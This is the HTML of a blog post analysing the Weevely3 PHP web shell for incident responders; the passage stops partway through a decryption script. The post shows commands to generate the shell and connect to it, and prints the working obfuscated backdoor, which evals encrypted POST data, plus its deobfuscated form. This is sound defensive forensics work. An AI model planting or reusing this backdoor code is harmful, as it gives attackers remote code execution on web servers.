@@ -1,0 +1,622 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?">
+
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Weevely Backdoor Analysis | Arti Karahoda</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Weevely Backdoor Analysis" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Weevely is a powerful polymorphic backdoor used in web post-explotation; this tool is written in Python and it generates a small obfuscated PHP shell which is then delievered to the targeted web server. The article will lay out it’s communication chain and encryption scheme in order to assist blue team operators during a DFIR process." />
+<meta property="og:description" content="Weevely is a powerful polymorphic backdoor used in web post-explotation; this tool is written in Python and it generates a small obfuscated PHP shell which is then delievered to the targeted web server. The article will lay out it’s communication chain and encryption scheme in order to assist blue team operators during a DFIR process." />
+<link rel="canonical" href="https://artikrh.github.io/posts/weevely-backdoor-analysis.html" />
+<meta property="og:url" content="https://artikrh.github.io/posts/weevely-backdoor-analysis.html" />
+<meta property="og:site_name" content="Arti Karahoda" />
+<meta property="og:image" content="https://artikrh.github.io/assets/images/weevely.png" />
+<script type="application/ld+json">
+{"@type":"WebPage","image":"https://artikrh.github.io/assets/images/weevely.png","url":"https://artikrh.github.io/posts/weevely-backdoor-analysis.html","description":"Weevely is a powerful polymorphic backdoor used in web post-explotation; this tool is written in Python and it generates a small obfuscated PHP shell which is then delievered to the targeted web server. The article will lay out it’s communication chain and encryption scheme in order to assist blue team operators during a DFIR process.","headline":"Weevely Backdoor Analysis","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta property="og:type" content="article">
+    <meta property='article:author' content='Arti Karahoda'/>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes">
+    <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+    <style>
+section #title {
+  padding:0;
+}
+#nav {
+  list-style-type: none !important;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  list-style-image: none !important;
+}
+
+#nav li {
+  float: left;
+}
+
+#nav li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 8px 8px;
+  text-decoration: none;
+}
+
+#nav li a:hover {
+  background-color: #111;
+}
+
+*:focus {
+  outline:none !important
+}
+    </style>
+  <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>Arti Karahoda</h1>
+          <p>Cyber Security & Data Protection</p>
+          <ul id="nav">
+              <li><a href="/">Home</a></li>
+              <li><a href="/#posts">Posts</a></li>
+              <li><a href="/#-whoami">About</a></li>
+              <li><a href="/#contact">Contact</a></li>
+            </ul>
+          <hr></div>
+
+        <style>
+.wrapper {
+  max-width: 700px;
+}
+section {
+  max-width: 700px;
+  padding: 30px 0px 0px 0px;
+}
+pre, code {
+    white-space: pre-wrap;
+}
+@media all and (max-width:480px) {
+    img {float:center;display:block;margin:0 auto;}
+}
+
+@media all and (min-width:480px) {
+    img {float:left;padding-right:30px;margin:0 auto;}
+}
+ul {
+    list-style-image: none;
+    list-style: none;
+}
+ul ul {
+    margin:0;
+}
+p + ul {
+    list-style: disc !important;
+}
+img {
+    margin-bottom:8px;
+    width: 100%;
+}
+pre, code {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+}
+.highlighter-rouge {
+    color: cyan;
+}
+</style>
+
+<p><i><strong>30 March, 2020</strong> — <a href="../">Go back to homepage</a></i></p>
+<h1 id="weevely-backdoor-analysis--blue-team-dfir">Weevely Backdoor Analysis / Blue Team DFIR</h1>
+
+<p><img align="center" src="/assets/images/weevely.png" /></p>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+  <li><a href="#1-executive-summary">1. Executive Summary</a></li>
+  <li><a href="#2-weevely-setup">2. Weevely Setup</a></li>
+  <li><a href="#3-network-inspection">3. Network Inspection</a></li>
+  <li><a href="#4-backtracking">4. Backtracking</a></li>
+  <li><a href="#5-automation">5. Automation</a></li>
+  <li><a href="#6-yara-rule">6. YARA Rule</a></li>
+</ul>
+
+<h1 id="1-executive-summary">1. Executive Summary</h1>
+
+<p>Weevely is a versatile tool written in Python which serves as a web shell during the post-explotation phase. As an open-source project, it is available in <a href="https://github.com/epinna/weevely3" target="_blank">GitHub</a> – where weevely3 is the latest version being maintained – and can be installed through the APT Package Manager on Linux as well. It has powerful features by leveraging more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.</p>
+
+<p>Considering its small and polymorphic nature, it is hardly detected by AV vendors and blue team operators might find its encrypted communication chain difficult to revert. Therefore, this article will examine traffic network this script generates in order to facilitate DFIR.</p>
+
+<h1 id="2-weevely-setup">2. Weevely Setup</h1>
+
+<p>You can <a href="https://github.com/epinna/weevely3/wiki/Install">install</a> Weevely by either cloning the GitHub repository or installing the Debian-based package through APT. We are going to use the latest and maintained version which is Weevely3.</p>
+
+<p>For demonstration purposes, I will generate “<i>artikrh.php</i>” with a password of “<i>artikrh</i>”, which is then uploaded to the target web server and accessed through CLI:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>weevely generate artikrh artikrh.php
+<span class="gp">$</span><span class="w"> </span>weevely http://a150b4a9.eu.ngrok.io/artikrh.php artikrh
+<span class="go">
+</span><span class="gp">weevely&gt;</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></figure>
+
+<h1 id="3-network-inspection">3. Network inspection</h1>
+
+<p>For this section, let’s suppose we are performing digital forensics and incident response. We can use Wireshark to examine the network traffic by using the <code class="language-plaintext highlighter-rouge">http.request.uri contains "artikrh.php"</code> filter to identify relevant packets to the suspicious PHP file:</p>
+
+<p><img src="/assets/images/weevely1.png" alt="Weevely Packets" /></p>
+
+<p>Following the HTTP stream of these packets show gibberish POST data which may imply encryption and/or encoding:</p>
+
+<p><img src="/assets/images/weevely2.png" alt="Weevely TCP Stream" /></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">.XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5ev6t4ATRBAeG5NExNHoRMQo120bb3b9572cI.O5V$</span>bDA2<span class="k">*</span>7A!fm</code></pre></figure>
+
+<p>If we take a close look at it from a high-level perspective, we may notice some random unidentified bytes at the beginning (<code class="language-plaintext highlighter-rouge">.XJ_Aaf.Yzk+W,so</code>) followed by what seems to be hexadecimal values (<code class="language-plaintext highlighter-rouge">11a12a4a68f2</code>) and Base64-encoded content (<code class="language-plaintext highlighter-rouge">Gqx5ev6t4ATRBAeG5NExNHoRMQo</code>). At the end of this data, we may notice additional hex numbers followed by again random data in a structure as seen below:</p>
+
+<p><img src="/assets/images/weevely-data.svg" alt="Weevely Data Skeleton" /></p>
+
+<p>At this point, the only part that we can make sense of is the Base64-encoded part, but which results in possible encrypted data when decoded:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Gqx5ev6t4ATRBAeG5NExNHoRMQo"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="go">
+.¬yzþ.à.Ñ...äÑ14z.1</span></code></pre></figure>
+
+<p>Considering that we already got a data skeleton in the bigger picture, we may turn back to the original script to further advance.</p>
+
+<h1 id="4-backtracking">4. Backtracking</h1>
+
+<p>The content of the extracted “<i>artikrh.php</i>” file from the attacked web server is as follows:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$h</span><span class="o">=</span><span class="s1">'len(Q$t);$oQ="";QQQfor($i=0;$i&lt;$l;)Q{for($QjQ=0;($j&lt;$c&amp;&amp;$i&lt;$lQ);$'</span><span class="p">;</span>
+<span class="nv">$P</span><span class="o">=</span><span class="s1">'Q("/$kQh(Q.+)$kf/"QQ,Q@file_gQet_contents("pQhp://inpuQt"),$m)Q=='</span><span class="p">;</span>
+<span class="nv">$M</span><span class="o">=</span><span class="s1">'1) {Q@ob_stQart(Q);@evQal(@gzuncoQmpressQQ(@x(@base6Q4_deQcode(Q$'</span><span class="p">;</span>
+<span class="nv">$B</span><span class="o">=</span><span class="s1">'$Qk="b02Q70e74";$kQQh="11a12a4a68f2"Q;Q$kf=QQ"120bb3b957QQ2c";$p='</span><span class="p">;</span>
+<span class="nv">$f</span><span class="o">=</span><span class="s1">'"1DGp1QY6lWKI3pJ2P"Q;Qfunction x($tQ,$kQ){$QcQ=strlen($k);$l=sQtr'</span><span class="p">;</span>
+<span class="nv">$W</span><span class="o">=</span><span class="s1">'Qse64_encode(@x(Q@gzcomQpress(Q$o)Q,$k))Q;print("$pQ$kh$r$Qkf");}'</span><span class="p">;</span>
+<span class="nv">$y</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'crbebateb_bbfunbction'</span><span class="p">);</span>
+<span class="nv">$C</span><span class="o">=</span><span class="s1">'m[1])Q,$k)));$o=@Qob_QQget_conQtents();@ob_QeQnd_clean()Q;$Qr=@ba'</span><span class="p">;</span>
+<span class="nv">$r</span><span class="o">=</span><span class="s1">'j+Q+,$i++Q){$Qo.=$tQ{$i}^$Qk{$j};}}rQeturn $oQ;}ifQ (@pQreg_match'</span><span class="p">;</span>
+<span class="nv">$I</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'Q'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="nv">$B</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="nv">$h</span><span class="o">.</span><span class="nv">$r</span><span class="o">.</span><span class="nv">$P</span><span class="o">.</span><span class="nv">$M</span><span class="o">.</span><span class="nv">$C</span><span class="o">.</span><span class="nv">$W</span><span class="p">);</span>
+<span class="nv">$X</span><span class="o">=</span><span class="nv">$y</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span><span class="nv">$I</span><span class="p">);</span><span class="nv">$X</span><span class="p">();</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Clearly, the PHP is obfuscated, however we can already see suspicious functions such as:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ob_stQart</code> =&gt; <a href="https://www.php.net/manual/en/function.ob-start.php">ob_start()</a></li>
+  <li><code class="language-plaintext highlighter-rouge">evQal</code> =&gt; <a href="https://www.php.net/manual/en/function.eval.php">eval()</a></li>
+  <li><code class="language-plaintext highlighter-rouge">gzuncoQmpress</code> =&gt; <a href="https://www.php.net/manual/en/function.gzuncompress.php">gzuncompress()</a></li>
+  <li><code class="language-plaintext highlighter-rouge">base6Q4_deQcode</code> =&gt; <a href="https://www.php.net/manual/en/function.base64-decode.php">base64_decode()</a></li>
+</ul>
+
+<p>As a side note, you can google parts of this code in Google which may lead you eventually to Weevely3-related artifacts, so you know what the attacker has used. Do keep in mind that the script is polymorphic, therefore, the function order and variable names will always change randomly during generation.</p>
+
+<p>We can either deobfuscate it partially by manually executing the above PHP code in CLI without including the last <code class="language-plaintext highlighter-rouge">$X</code> variable:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$h</span><span class="o">=</span><span class="s1">'len(Q$t);$oQ="";QQQfor($i=0;$i&lt;$l;)Q{for($QjQ=0;($j&lt;$c&amp;&amp;$i&lt;$lQ);$'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$P</span><span class="o">=</span><span class="s1">'Q("/$kQh(Q.+)$kf/"QQ,Q@file_gQet_contents("pQhp://inpuQt"),$m)Q=='</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$M</span><span class="o">=</span><span class="s1">'1) {Q@ob_stQart(Q);@evQal(@gzuncoQmpressQQ(@x(@base6Q4_deQcode(Q$'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$B</span><span class="o">=</span><span class="s1">'$Qk="b02Q70e74";$kQQh="11a12a4a68f2"Q;Q$kf=QQ"120bb3b957QQ2c";$p='</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$f</span><span class="o">=</span><span class="s1">'"1DGp1QY6lWKI3pJ2P"Q;Qfunction x($tQ,$kQ){$QcQ=strlen($k);$l=sQtr'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$W</span><span class="o">=</span><span class="s1">'Qse64_encode(@x(Q@gzcomQpress(Q$o)Q,$k))Q;print("$pQ$kh$r$Qkf");}'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$y</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'b'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'crbebateb_bbfunbction'</span><span class="p">);</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$C</span><span class="o">=</span><span class="s1">'m[1])Q,$k)));$o=@Qob_QQget_conQtents();@ob_QeQnd_clean()Q;$Qr=@ba'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$r</span><span class="o">=</span><span class="s1">'j+Q+,$i++Q){$Qo.=$tQ{$i}^$Qk{$j};}}rQeturn $oQ;}ifQ (@pQreg_match'</span><span class="p">;</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="nv">$I</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">'Q'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="nv">$B</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="nv">$h</span><span class="o">.</span><span class="nv">$r</span><span class="o">.</span><span class="nv">$P</span><span class="o">.</span><span class="nv">$M</span><span class="o">.</span><span class="nv">$C</span><span class="o">.</span><span class="nv">$W</span><span class="p">);</span>
+<span class="nx">php</span> <span class="o">&gt;</span> <span class="k">print</span> <span class="p">(</span><span class="nv">$I</span><span class="p">);</span>
+
+<span class="nv">$k</span><span class="o">=</span><span class="s2">"b0270e74"</span><span class="p">;</span><span class="nv">$kh</span><span class="o">=</span><span class="s2">"11a12a4a68f2"</span><span class="p">;</span><span class="nv">$kf</span><span class="o">=</span><span class="s2">"120bb3b9572c"</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span><span class="s2">"1DGp1Y6lWKI3pJ2P"</span><span class="p">;</span><span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="nv">$k</span><span class="p">){</span><span class="nv">$c</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span><span class="nv">$l</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span><span class="nv">$o</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$l</span><span class="p">;){</span><span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$c</span><span class="o">&amp;&amp;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$l</span><span class="p">);</span><span class="nv">$j</span><span class="o">++</span><span class="p">,</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="nv">$o</span><span class="o">.=</span><span class="nv">$t</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span><span class="o">^</span><span class="nv">$k</span><span class="p">{</span><span class="nv">$j</span><span class="p">};}}</span><span class="k">return</span> <span class="nv">$o</span><span class="p">;}</span><span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$kh</span><span class="s2">(.+)</span><span class="nv">$kf</span><span class="s2">/"</span><span class="p">,</span><span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">),</span><span class="nv">$m</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="o">@</span><span class="nb">gzuncompress</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="nv">$k</span><span class="p">)));</span><span class="nv">$o</span><span class="o">=@</span><span class="nb">ob_get_contents</span><span class="p">();</span><span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span><span class="nv">$r</span><span class="o">=@</span><span class="nb">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nb">gzcompress</span><span class="p">(</span><span class="nv">$o</span><span class="p">),</span><span class="nv">$k</span><span class="p">));</span><span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="nv">$p$kh$r$kf</span><span class="s2">"</span><span class="p">);}</span></code></pre></figure>
+
+<p>Or we can use the <a href="https://www.unphp.net/">UnPHP</a> online which fully deobfuscates and formats the backdoor PHP code:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$k</span> <span class="o">=</span> <span class="s2">"b0270e74"</span><span class="p">;</span>
+<span class="nv">$kh</span> <span class="o">=</span> <span class="s2">"11a12a4a68f2"</span><span class="p">;</span>
+<span class="nv">$kf</span> <span class="o">=</span> <span class="s2">"120bb3b9572c"</span><span class="p">;</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="s2">"1DGp1Y6lWKI3pJ2P"</span><span class="p">;</span>
+<span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
+    <span class="nv">$l</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;(</span><span class="nv">$j</span> <span class="o">&lt;</span> <span class="nv">$c</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">);</span><span class="nv">$j</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$o</span><span class="o">.=</span> <span class="nv">$t</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span> <span class="o">^</span> <span class="nv">$k</span><span class="p">{</span><span class="nv">$j</span><span class="p">};</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$o</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$kh</span><span class="s2">(.+)</span><span class="nv">$kf</span><span class="s2">/"</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">),</span> <span class="nv">$m</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
+    <span class="k">eval</span><span class="p">(</span><span class="o">@</span><span class="nb">gzuncompress</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nv">$k</span><span class="p">)));</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
+    <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span>
+    <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">base64_encode</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nb">gzcompress</span><span class="p">(</span><span class="nv">$o</span><span class="p">),</span> <span class="nv">$k</span><span class="p">));</span>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">"</span><span class="nv">$p$kh$r$kf</span><span class="s2">"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>We notice some pre-defined variables, three which are in hex format (<code class="language-plaintext highlighter-rouge">$k</code>, <code class="language-plaintext highlighter-rouge">$kh</code>, and <code class="language-plaintext highlighter-rouge">$kf</code>) – a total number of 32 characters together, which might indicate MD5 hashing – and an unknown <code class="language-plaintext highlighter-rouge">$p</code> variable which seems to hold Base64-encoded data (decoding it outputs gibberish). Furthermore, there is a <code class="language-plaintext highlighter-rouge">x()</code> function which seems to XOR encrypt input data <code class="language-plaintext highlighter-rouge">$t</code> with input key <code class="language-plaintext highlighter-rouge">$k</code> (we already know <code class="language-plaintext highlighter-rouge">$k</code>).</p>
+
+<p>On the other hand, there is the last section which seems to do all the action of communicating back and forth. We start breaking this part down by analyzing the following line of code:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$kh</span><span class="s2">(.+)</span><span class="nv">$kf</span><span class="s2">/"</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">),</span> <span class="nv">$m</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span></code></pre></figure>
+
+<p>This means that if HTTP request POST data contains <code class="language-plaintext highlighter-rouge">$kh</code> (the initial <code class="language-plaintext highlighter-rouge">11a12a4a68f2</code> hex data we identified earlier) and <code class="language-plaintext highlighter-rouge">$kf</code> (the enclosing <code class="language-plaintext highlighter-rouge">120bb3b9572c</code>) strings in it, store the match(es) in array <code class="language-plaintext highlighter-rouge">$m</code> (as described in PHP’s <a href="https://www.php.net/manual/en/function.file-get-contents.php"><code class="language-plaintext highlighter-rouge">file_get_contents()</code></a> built-in function). In this case, the array will be comprised of two items:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">$m[0]</code> =&gt; the whole match: <code class="language-plaintext highlighter-rouge">$kh</code> (12 chars) + Base64 data + <code class="language-plaintext highlighter-rouge">$kf</code> (12 chars)</li>
+  <li><code class="language-plaintext highlighter-rouge">$m[1]</code> =&gt; match in between static delimiters (<code class="language-plaintext highlighter-rouge">$kh</code>, <code class="language-plaintext highlighter-rouge">$kf</code>): Base64 data</li>
+</ol>
+
+<p>It is worth noting that the regular expression excludes the unidentified random data at both ends of POST request string, so the initial diagram is transformed into:</p>
+
+<p><img src="/assets/images/weevely-data2.svg" alt="Weevely Data Skeleton 2" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">eval()</code> bit is comprised in the following manner:</p>
+<ol>
+  <li>Initially, <code class="language-plaintext highlighter-rouge">$m[1]</code> (data) is Base64 decoded</li>
+  <li>Decoded data is XOR decrypted with key <code class="language-plaintext highlighter-rouge">$k</code> (in this case: <code class="language-plaintext highlighter-rouge">b0270e74</code>)</li>
+  <li>Decrypted data is GNU zip (Gzip) decompressed to provide the arbitrary PHP code which is then executed by <code class="language-plaintext highlighter-rouge">eval()</code></li>
+</ol>
+
+<p>Output buffer (OB) functions are used to retrieve executed commands’ result:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ob_start()</code>: Turns on output buffering</li>
+  <li><code class="language-plaintext highlighter-rouge">ob_get_contents()</code>: Standard out from the execution of arbitrary PHP code from <code class="language-plaintext highlighter-rouge">eval()</code></li>
+  <li><code class="language-plaintext highlighter-rouge">ob_end_clean()</code>: Cleans the output buffer and turns off output buffering</li>
+</ul>
+
+<p>Since we now have a clear idea on what the script does, we can decrypt traffic by backtracking. In summary, we can retrieve the first packet data in plaintext by storing it into a variable (in this case <code class="language-plaintext highlighter-rouge">$phpinput</code>) and printing the raw PHP code instead of sending it to <code class="language-plaintext highlighter-rouge">eval()</code>:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$k</span> <span class="o">=</span> <span class="s2">"b0270e74"</span><span class="p">;</span> <span class="c1">// FIRST PART: 8 first chars</span>
